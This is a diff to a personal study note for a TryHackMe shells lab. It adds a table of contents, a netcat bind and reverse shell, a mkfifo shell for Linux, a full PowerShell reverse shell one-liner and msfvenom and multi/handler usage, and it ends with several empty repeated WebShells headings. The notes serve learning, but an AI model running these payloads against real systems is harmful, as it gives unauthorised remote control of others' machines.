@@ -7,6 +7,10 @@ https://tryhackme.com/room/introtoshells
 - [[#Netcat Shell Stabilization]]
 - [[#Socat]]
 - [[#Socat Encrypted Shells]]
+- [[#Common Shell Payloads]]
+- [[#`msfvenom`]]
+- [[#`multi/handler`]]
+- [[#WebShells]]
 - 
  
 ___
@@ -149,21 +153,96 @@ ___
 ### Common Shell Payloads
 [[#Table of contents|Back to the top]]
 
+Option `-e` to execute process on connection
 
+**Bind Shell**
+Connect to listener with `nc -lvnp <port_number> -e /bin/bash` --> *executes bind shell on target*
+
+**Reverse Shell**
+Connect back to listener with `nc <LOCAL-IP> <PORT> -e /bin/bash` --> *executes reverse shell on target*
+
+Works perfectly on windows, might not on Linux
+
+--> Linux bind shell listener payload: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+--> Linux reverse shell listener payload: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+
+--> Powershell reverse shell payload:
+`powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`
+
+[More resources](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 ___
-###
+### `msfvenom`
+[[#Table of contents|Back to the top]]
+
+Payload generator, part of Metasploit
+
+Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
+
+- **Staged:** sent in 2 parts
+	$\rightarrow$ Stager executes on server, connects back to listener, uses connection to load real payload, prevents actual payload from touching disk where it could be detected by antivirus
+- **Stageless:** entirely self-contained
+
+**Payload naming convention:** `<OS>/<arch>/<payload>`
+*Example:* `linux/x86/shell_reverse_tcp`
+Exception: Windows 32 --> arch unspecified: `windows/<payload>`
+
+Stageless: `shell_reverse_tcp`
+Staged: `shell/reverse_tcp`
+
+`msfvenom --list payloads` + `grep` to find payload
+
+___
+### `multi/handler`
+[[#Table of contents|Back to the top]]
+
+Reverse shell catching tool
+
+1. `msfconsole`: start metasploit console
+2. `use multi/handler`: start multi/handler
+3. `options`: display available options --> payload, LHOST and LPORT
+4. Set options
+	- `set PAYLOAD <payload>`
+	- `set LHOST <listen-address>`
+	- `set LPORT <listen-port>`
+5. `exploit -j`: start module (listener) as job in background
+
+To foreground: `sessions`, `sessions <session_number>`
+
+___
+### WebShells
 [[#Table of contents|Back to the top]]
 
 
+
 ___
-###
+### WebShells
 [[#Table of contents|Back to the top]]
 
 
+
 ___
-###
+### WebShells
 [[#Table of contents|Back to the top]]
+
+
+
+___
+### WebShells
+[[#Table of contents|Back to the top]]
+
+
+
+___
+### WebShells
+[[#Table of contents|Back to the top]]
+
+
+
+___
+### WebShells
+[[#Table of contents|Back to the top]]
+
 
 
 ___
